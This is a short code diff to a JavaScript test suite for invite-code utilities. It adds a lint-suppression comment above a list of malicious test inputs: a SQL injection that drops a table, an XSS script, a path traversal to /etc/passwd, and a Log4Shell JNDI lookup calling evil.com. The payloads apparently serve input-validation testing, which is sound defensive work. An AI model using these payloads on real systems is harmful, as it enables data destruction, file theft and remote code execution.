@@ -560,6 +560,7 @@ describe("inviteCode utilities", () => {
         "'; DROP TABLE invites; --",
         '<script>alert("xss")</script>',
         "../../../../etc/passwd",
+        // eslint-disable-next-line no-template-curly-in-string
         "${jndi:ldap://evil.com/a}",
       ];
 
